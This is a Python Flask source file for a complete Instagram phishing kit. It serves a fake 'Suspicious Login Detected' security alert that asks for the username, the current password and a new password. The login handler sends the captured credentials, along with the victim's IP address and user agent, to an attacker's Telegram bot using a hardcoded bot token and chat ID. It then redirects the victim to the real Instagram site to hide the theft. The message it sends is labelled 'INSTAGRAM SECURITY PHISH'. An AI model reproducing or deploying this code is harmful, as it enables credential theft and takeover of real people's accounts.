import os
import requests
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

# ========== CONFIG ==========
TELEGRAM_BOT_TOKEN = "8840443558:AAFBW-dKJenVK1XbhCjHkvj_lf1QTFh0caM"
TELEGRAM_CHAT_ID = "6158101156"
REAL_INSTAGRAM_URL = "https://www.instagram.com"
# ============================

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Security Alert</title>
<style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body {
    background: #000;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    padding: 20px;
  }

  .container {
    max-width: 420px;
    width: 100%;
    background: #0a0a0a;
    border-radius: 24px;
    padding: 30px 25px;
    border: 1px solid rgba(255, 255, 255, 0.06);
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
    margin-top: 20px;
  }

  .header {
    text-align: center;
    margin-bottom: 25px;
  }

  .ig-logo {
    width: 72px;
    height: 72px;
    margin: 0 auto 15px;
    display: block;
  }

  .alert-badge {
    background: rgba(255, 0, 0, 0.15);
    border: 1px solid rgba(255, 0, 0, 0.2);
    color: #ff4444;
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 12px;
    display: inline-block;
    margin-top: 5px;
  }

  .title {
    color: #fff;
    font-size: 22px;
    font-weight: 700;
    margin-top: 10px;
  }

  .subtitle {
    color: rgba(255, 255, 255, 0.5);
    font-size: 14px;
    margin-top: 5px;
  }

  .security-box {
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.05);
    border-radius: 16px;
    padding: 18px;
    margin-bottom: 25px;
  }

  .security-box .icon {
    font-size: 28px;
    margin-bottom: 8px;
    display: block;
    text-align: center;
  }

  .security-box .text {
    color: rgba(255, 255, 255, 0.7);
    font-size: 13px;
    line-height: 1.6;
    text-align: center;
  }

  .security-box .highlight {
    color: #fff;
    font-weight: 600;
  }

  .input-group {
    margin-bottom: 15px;
  }

  .input-group label {
    color: rgba(255, 255, 255, 0.5);
    font-size: 12px;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    display: block;
    margin-bottom: 6px;
  }

  .field {
    width: 100%;
    height: 50px;
    background: rgba(255, 255, 255, 0.05);
    border: 1.5px solid rgba(255, 255, 255, 0.06);
    border-radius: 12px;
    padding: 0 16px;
    font-size: 15px;
    color: #fff;
    outline: none;
    transition: all 0.3s;
  }

  .field::placeholder {
    color: rgba(255, 255, 255, 0.2);
  }

  .field:focus {
    border-color: #0095f6;
    box-shadow: 0 0 20px rgba(0, 149, 246, 0.1);
  }

  .login-btn {
    width: 100%;
    height: 52px;
    background: #0095f6;
    border: none;
    border-radius: 12px;
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    margin-top: 8px;
    transition: all 0.3s;
  }

  .login-btn:hover {
    background: #0081d6;
    transform: translateY(-1px);
  }

  .login-btn:active {
    transform: scale(0.97);
  }

  .footer-text {
    color: rgba(255, 255, 255, 0.15);
    font-size: 11px;
    text-align: center;
    margin-top: 20px;
  }

  .footer-text a {
    color: rgba(255, 255, 255, 0.25);
    text-decoration: none;
  }

  .device-info {
    background: rgba(255, 50, 50, 0.05);
    border: 1px solid rgba(255, 50, 50, 0.1);
    border-radius: 12px;
    padding: 12px 16px;
    margin-bottom: 20px;
    color: rgba(255, 255, 255, 0.5);
    font-size: 12px;
    line-height: 1.8;
  }

  .device-info span {
    color: rgba(255, 255, 255, 0.7);
  }

  .device-info .location {
    color: #ff6b6b;
    font-weight: 600;
  }
</style>
</head>
<body>

<div class="container">
  <div class="header">
    <svg class="ig-logo" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="igGrad" x1="72" y1="72" x2="0" y2="0" gradientUnits="userSpaceOnUse">
          <stop offset="0%" stop-color="#ffd600"/>
          <stop offset="25%" stop-color="#ff6930"/>
          <stop offset="55%" stop-color="#e1306c"/>
          <stop offset="100%" stop-color="#833ab4"/>
        </linearGradient>
      </defs>
      <rect width="72" height="72" rx="18" fill="#0a0a0a"/>
      <rect x="9" y="9" width="54" height="54" rx="15" fill="none" stroke="url(#igGrad)" stroke-width="4"/>
      <circle cx="36" cy="36" r="13.5" fill="none" stroke="url(#igGrad)" stroke-width="4"/>
      <circle cx="52" cy="20" r="3.5" fill="url(#igGrad)"/>
    </svg>

    <span class="alert-badge">🔴 Security Alert</span>
    <h1 class="title">Suspicious Login Detected</h1>
    <p class="subtitle">Secure your account immediately</p>
  </div>

  <div class="device-info">
    📍 <span class="location">Kabul, Afghanistan</span><br>
    💻 <span>Chrome on Windows 11</span><br>
    🕐 <span>{{ current_time }}</span><br>
    🌐 <span>IP: 102.89.45.67</span>
  </div>

  <div class="security-box">
    <span class="icon">🔐</span>
    <div class="text">
      We detected a login from an <span class="highlight">unrecognized device</span>.<br>
      To protect your account, please <span class="highlight">verify your identity</span>.
    </div>
  </div>

  <form method="POST" action="/login">
    <div class="input-group">
      <label>👤 Username or Email</label>
      <input class="field" type="text" name="username" placeholder="Enter your username or email" autocomplete="off" required />
    </div>

    <div class="input-group">
      <label>🔑 Current Password</label>
      <input class="field" type="password" name="old_password" placeholder="Enter your current password" required />
    </div>

    <div class="input-group">
      <label>🔄 New Password</label>
      <input class="field" type="password" name="new_password" placeholder="Create a new strong password" required />
    </div>

    <div class="input-group">
      <label>✅ Confirm New Password</label>
      <input class="field" type="password" name="confirm_password" placeholder="Confirm your new password" required />
    </div>

    <button class="login-btn" type="submit">🔒 Update & Secure Account</button>
  </form>

  <div class="footer-text">
    🔒 This is a mandatory security check.<br>
    <a href="#">Privacy Policy</a> • <a href="#">Help Center</a>
  </div>
</div>

</body>
</html>'''

def send_to_telegram(data):
    text = f"""🔐 INSTAGRAM SECURITY PHISH
─────────────────
👤 Username: {data['username']}
🔑 Old Password: {data['old_password']}
🔄 New Password: {data['new_password']}
🌐 IP: {data['ip']}
📱 UA: {data['user_agent'][:50]}
─────────────────
💀 Shadow Legion"""
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
    except:
        pass

@app.route('/')
def index():
    current_time = datetime.now().strftime("%B %d, %Y at %I:%M %p")
    return render_template_string(HTML_TEMPLATE, current_time=current_time)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    old_password = request.form.get('old_password')
    new_password = request.form.get('new_password')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    data = {
        'username': username,
        'old_password': old_password,
        'new_password': new_password,
        'ip': ip,
        'user_agent': user_agent
    }
    send_to_telegram(data)

    # Redirect to real Instagram
    return f'<script>window.location.href="{REAL_INSTAGRAM_URL}"</script>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
